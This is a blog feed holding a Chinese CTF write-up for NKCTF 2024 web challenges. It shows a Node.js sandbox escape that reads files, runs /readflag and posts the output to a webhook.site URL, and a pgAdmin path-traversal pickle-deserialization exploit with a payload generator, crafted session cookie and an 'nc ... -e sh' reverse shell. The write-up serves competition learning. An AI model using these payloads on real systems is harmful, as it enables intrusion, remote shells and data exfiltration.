{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY • All posts by \"比赛\" tag",
    "description": "坚持与努力",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/NKCTF%202024/",
            "url": "https://lookhui.github.io/NKCTF%202024/",
            "title": "NKCTF",
            "date_published": "2024-03-25T01:26:11.000Z",
            "content_html": "<h2 id=\"nkctf-2024\"><a class=\"anchor\" href=\"#nkctf-2024\">#</a> NKCTF 2024</h2>\n<h3 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h3>\n<h4 id=\"my-first-cms\"><a class=\"anchor\" href=\"#my-first-cms\">#</a> my first cms</h4>\n<p>爆破密码进去直接命令执行得到 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/KycNRPwgl7VuXT3.png\" alt=\"image-20240324155515773\" /></p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/capture0x/CMSMadeSimple2</span><br><span class=\"line\">https://github.com/capture0x/CMSMadeSimple</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"全世界最简单的ctf\"><a class=\"anchor\" href=\"#全世界最简单的ctf\">#</a> 全世界最简单的 CTF</h4>\n<p>使用 nodejs 的 fs 模块可以读取文件，我猜测文件位置是 app/app.js 查看到源码</p>\n<p>然后使用语句</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">      const fs = gg.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/app/app.js&#x27;);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;fs&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>即可读取到 app/app.js</p>\n<p>他源码并没有过滤掉 fork 我们正好可以利用</p>\n<p>最终脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 文件写入suceess</span><br><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">let content = `</span><br><span class=\"line\">        let cs = require(&#x27;$&#123;`$&#123;&#x27;child_p&#x27;&#125;rocess&#x27;).exe`&#125;cSync(&#x27;/readflag&#x27;).toString();</span><br><span class=\"line\">        $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;.on(&quot;message&quot;,function(msg)&#123;</span><br><span class=\"line\">            fetch(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: cs&#125;)&#125;);</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">      `;</span><br><span class=\"line\">      const fs = gg.mainModule.require(&#x27;fs&#x27;).appendFileSync(&quot;./readflag1.js&quot;,content);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;fs&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//通信成功</span><br><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const g = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">      const h = g.mainModule.require(`$&#123;&#x27;child_p&#x27;&#125;rocess`).fork(&#x27;./readflag1.js&#x27;);</span><br><span class=\"line\">      h.send(&#x27;hello&#x27;);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;h&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>注意过滤即可</p>\n<h4 id=\"attack_tacooooo\"><a class=\"anchor\" href=\"#attack_tacooooo\">#</a> attack_tacooooo</h4>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</span><br></pre></td></tr></table></figure></p>\n<p>脚本如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import struct</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">def produce_pickle_bytes(platform, cmd):</span><br><span class=\"line\">    b = b&#x27;\\x80\\x04\\x95&#x27;</span><br><span class=\"line\">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class=\"line\">    b += b&#x27;\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class=\"line\">    b += b&#x27;\\x94\\x8c\\x06system\\x94\\x93\\x94&#x27;</span><br><span class=\"line\">    b += b&#x27;\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class=\"line\">    b += b&#x27;\\x94\\x85\\x94R\\x94.&#x27;</span><br><span class=\"line\">    print(b)</span><br><span class=\"line\">    return b</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    if len(sys.argv) != 2:</span><br><span class=\"line\">        exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class=\"line\">    with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class=\"line\">        f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;mshta.exe http://&#123;HOST&#125;/&quot;))</span><br><span class=\"line\">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class=\"line\">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;curl http://&#123;HOST&#125;/&quot;))</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zbWJzZXJ2ZXItdTc1bm9vczg3dms0NGYucHk=\">还有一个 smbserver.py</span></p>\n<p>首先要知道这个漏洞是因为 join 去合并拼接产生</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">此函数有两个缺点：</span><br><span class=\"line\"></span><br><span class=\"line\">它没有设置不应转义的受信任基路径，因此返回 。os.path.join(&quot;/opt/safe/&quot;, &quot;../../etc/passwd&quot;)/etc/passwd</span><br><span class=\"line\">它在其参数中使用最右边的绝对路径作为根路径，因此返回 。os.path.join(&quot;./safe/&quot;, &quot;do_not_escape_from_here&quot;, &quot;/etc/passwd&quot;)/etc/passwd</span><br></pre></td></tr></table></figure></p>\n<p>比赛题目环境是由 docker 容器搭建</p>\n<p>环境内无 curl 以及 bash</p>\n<p>但是有 nc 可以利用 nc 来达到反弹 shell</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 8.137.131.159 9006 -e sh</span><br></pre></td></tr></table></figure></p>\n<p>并且下面是需要利用</p>\n<p>pga4_session 来构造反序列化</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /browser/ HTTP/1.1</span><br><span class=\"line\">Host: 7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\">Referer: http://7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn/login?next=%2F</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!baeac19e-2dcc-4d96-a4c7-1ff410ddd8c2!AZleysLS+ZnrL20IU1mGt6lHxXc3O8/It0JHyC4sJqA=; PGADMIN_LANGUAGE=en</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure></p>\n<p>构造如上，路径无所谓</p>\n<p>公网 ip 监听端口即可</p>\n",
            "tags": [
                "比赛"
            ]
        }
    ]
}